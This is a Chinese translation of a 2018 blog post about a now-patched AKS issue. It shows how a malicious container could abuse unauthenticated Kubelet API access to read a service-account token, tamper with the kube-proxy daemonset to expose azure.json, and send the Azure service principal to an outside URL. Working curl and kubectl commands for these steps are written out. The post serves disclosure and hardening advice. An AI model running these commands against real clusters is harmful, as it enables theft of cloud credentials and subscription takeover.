<html>
<head>
<title>How a naughty docker image on AKS could give an attacker access to your Azure Subscription?</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">AKS上一个淘气的docker图片是如何让攻击者访问你的Azure订阅的？</h1>
<blockquote>原文：<a href="https://itnext.io/how-a-naughty-docker-image-on-aks-could-give-an-attacker-access-to-your-azure-subscription-6d05b92bf811?source=collection_archive---------7-----------------------#2018-06-10">https://itnext.io/how-a-naughty-docker-image-on-aks-could-give-an-attacker-access-to-your-azure-subscription-6d05b92bf811?source=collection_archive---------7-----------------------#2018-06-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="7e63" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated"><strong class="ak">TL；DR </strong>:在AKS集群中调度的恶意docker映像可以自动提取集群服务主体详细信息，允许攻击者提升其权限并针对受害者的Azure订阅运行命令。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/ea563c9f194675fc1cccc769451a67b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQ6mpstW2AfgRQLZyu2Eyw.jpeg"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">由<a class="ae kv" href="https://unsplash.com/photos/92_FGwSRQlA?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener ugc nofollow" target="_blank">马克·里切思</a>在<a class="ae kv" href="https://unsplash.com/search/photos/danger?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><blockquote class="kw kx ky"><p id="35ba" class="kz la lb lc b ld le jr lf lg lh ju li lj lk ll lm ln lo lp lq lr ls lt lu lv ij bi translated">免责声明:以下内容仅供参考。该漏洞只是为了强调需要保护您的AKS集群，不要使用不可信的docker映像。因此，使用此处包含的信息完全由您自己承担风险。</p></blockquote><p id="e9fd" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">我将演示我创建的一个漏洞，它允许一个简单的容器从AKS集群中找到Azure服务主体细节，并将其发送到一个远程URL。</p><p id="3abd" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">这里使用的大部分东西都是基于我不久前写的<a class="ae kv" href="https://medium.com/@pjbgf/taking-over-a-kubernetes-cluster-challenge-1-46b527d0f086" rel="noopener">接管AKS集群的帖子</a>。实现这一点的一个基础是Kubelet API技巧<a class="ae kv" rel="noopener ugc nofollow" target="_blank" href="/aks-kubernetes-security-walk-through-challenge-2-dbe3ed16beec">，它允许您在一个节点内查看任何正在运行的pod，即使您的pod作为非根用户/最低特权用户运行，它也会给您额外的权限。</a></p><p id="aa20" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">为了更好地理解我们将如何访问Azure订阅，您需要知道AKS基于<a class="ae kv" href="https://github.com/Azure/acs-engine" rel="noopener ugc nofollow" target="_blank"> ACS引擎</a>，这是一个开源项目，可以简化Azure上的集群供应。它在内部使用一个文件来存储服务主体名称(SPN ),这样它就可以与Azure API进行交互。该文件存在于每个群集节点中，位于以下路径:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="357c" class="me mf iq ma b gy mg mh l mi mj">/etc/kubernetes/azure.json</span></pre><p id="517e" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">有几种不同的方法可以获取该文件的内容，但本质上，我们需要将主机(节点)卷挂载到一个特权容器上。</p><p id="9872" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">我发现的最偷偷摸摸的方法是操作kube-proxy daemonset，它已经作为特权运行并挂载到/etc/kubernetes/certs。由于人们往往不太注意kube-system名称空间中发生的事情，我们将进行的更改很容易被忽略。</p><h2 id="d998" class="me mf iq bd mk ml mm dn mn mo mp dp mq lw mr ms mt lx mu mv mw ly mx my mz na bi translated">获取API服务器令牌</h2><p id="b0cb" class="pw-post-body-paragraph kz la iq lc b ld nb jr lf lg nc ju li lw nd ll lm lx ne lp lq ly nf lt lu lv ij bi translated">根据映像的调度方式，您可能会也可能不会在pod中装载API服务器令牌。为了使其更加通用，我们将从kube-proxy容器中获取令牌:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="8794" class="me mf iq ma b gy mg mh l mi mj">curl --connect-timeout 5 -sk https://10.240.0.4:10250/run/kube-system/$(curl -sk https://10.240.0.4:10250/runningpods/ | jq '.items[].metadata.name' | grep kube-proxy | sed 's/"//g')/kube-proxy/ -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token" -o token.txt</span></pre><p id="f21b" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">请注意，我们正在利用对IP 10.240.0.4上Kubelet API的未授权访问。这通常是AKS集群中的第一个节点。然而，更聪明的利用方式可以动态地发现这一点。</p><h2 id="0824" class="me mf iq bd mk ml mm dn mn mo mp dp mq lw mr ms mt lx mu mv mw ly mx my mz na bi translated">篡改kube-proxy</h2><p id="3ed1" class="pw-post-body-paragraph kz la iq lc b ld nb jr lf lg nc ju li lw nd ll lm lx ne lp lq ly nf lt lu lv ij bi translated">kube-proxy需要访问路径/etc/kubernetes/certs。我们将修改它，所以我们实际上挂载它的父文件夹。这个简单的改变将保持系统正常工作，因为certs映射仍然可用，但是，它也将为我们提供对azure.json文件的访问。这是我们将获得的全部内容:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ng"><img src="../Images/cb0ea2faf50cc330a75ba77dd1d1d312.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*meqluNUVlgy_vMpR9s_cvQ.png"/></div></div></figure><p id="cc66" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">理论上，这可以通过导出其yaml文件，用/kubernetes替换kubernetes/certs，然后应用更改来实现:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="ee50" class="me mf iq ma b gy mg mh l mi mj">kubectl get ds/kube-proxy --namespace kube-system -o yaml --export | sed -E 's/kubernetes\/certs/kubernetes/g' | kubectl apply --namespace kube-system -f -</span></pre><p id="346e" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">默认情况下，daemonsets上的更改仅在删除时推出。因此，在实际利用中，我们分三步进行:1 .导出，2。删除现有kube-proxy，3。应用更改。</p><p id="d3f6" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">这是完整的漏洞。sh:</p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="nh ni l"/></div></figure><p id="8ef9" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">当执行时，它将打印Azure SPN并将其发布到外部URL。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nj"><img src="../Images/ba746eecb4729c03076092d38d792d3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oJWofn3oSGwRm-iFfA5xYQ.png"/></div></div></figure><h2 id="1ad9" class="me mf iq bd mk ml mm dn mn mo mp dp mq lw mr ms mt lx mu mv mw ly mx my mz na bi translated">访问Azure订阅</h2><p id="a163" class="pw-post-body-paragraph kz la iq lc b ld nb jr lf lg nc ju li lw nd ll lm lx ne lp lq ly nf lt lu lv ij bi translated">有了这些信息，任何人都可以通过<a class="ae kv" href="https://docs.microsoft.com/en-us/cli/azure/install-azure-cli?view=azure-cli-latest" rel="noopener ugc nofollow" target="_blank"> Azure CLI </a>登录你的Azure订阅。</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="4c11" class="me mf iq ma b gy mg mh l mi mj">az login --service-principal -u SPN_USER_NAME -p PASSWORD --tenant TENANT_ID_OR_NAME</span></pre><p id="3d61" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">查询其权限:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="763e" class="me mf iq ma b gy mg mh l mi mj">az role assignment list --assignee SPN_USER_NAME</span></pre><p id="1633" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">默认情况下，SPN是群集资源组成员。但是，如果提供集群的人做得不好，这个SPN可能是订阅所有者、贡献者等。</p><p id="8112" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">无论哪种方式，从这一点来看，攻击者都有足够的权限来中断您的服务，或者在群集资源组中旋转新的资源来做他们想做的任何事情——我刚才听到的是加密挖掘吗？</p><p id="e684" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated">我在2018年2月与微软安全团队分享了一个类似的漏洞，他们正在努力修复它。同时，确保你只在集群中使用<strong class="lc ir">信任的</strong> docker镜像。</p></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><p id="4b81" class="pw-post-body-paragraph kz la iq lc b ld le jr lf lg lh ju li lw lk ll lm lx lo lp lq ly ls lt lu lv ij bi translated"><strong class="lc ir">2018年8月7日更新:这真是个好消息，微软已经修复了这个问题。下面的命令现在将导致HTTP 401未授权:</strong></p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="6297" class="me mf iq ma b gy mg mh l mi mj">curl -sk <a class="ae kv" href="https://10.240.0.4:10250/runningpods/" rel="noopener ugc nofollow" target="_blank">https://{NODE_IP}:10250/runningpods/</a><br/>curl --connect-timeout 5 -sk <a class="ae kv" href="https://10.240.0.4:10250/run/kube-system/kube-proxy-9cph5/kube-proxy/" rel="noopener ugc nofollow" target="_blank">https://{NODE_IP}:10250/run/kube-system/{POD_NAME}/kube-proxy/</a></span></pre></div></div>    
</body>
</html>